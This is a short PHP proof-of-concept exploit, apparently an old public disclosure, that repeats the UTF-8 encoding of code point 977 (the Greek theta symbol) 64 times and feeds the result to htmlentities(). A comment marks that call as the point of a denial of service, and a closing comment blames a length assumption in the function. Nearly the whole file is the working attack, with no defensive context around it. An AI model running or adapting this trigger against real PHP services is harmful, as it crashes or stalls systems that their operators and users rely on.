<?php
	/*	     Zarathu		*/
	/*    www.whitepaperclip.com 	*/
	
	//instantiate a string
	$str1 = "";
	
	for($i=0; $i < 64; $i++) {
		$str1 .= toUTF(977); //MUST start with 977 before bit-shifting
	}
	
	$str1 = htmlentities($str1, ENT_NOQUOTES, "UTF-8"); //DoS here
	
	echo $str1;
	/*
		htmlentities() method automatically assumes
		it is a max of 8 chars.  uses greek theta
		character bug from UTF-8
	*/
	
?>

<?php
	function toUTF($x) {
		return chr(($x >> 6) + 192) . chr(($x & 63) + 128);
	}
?>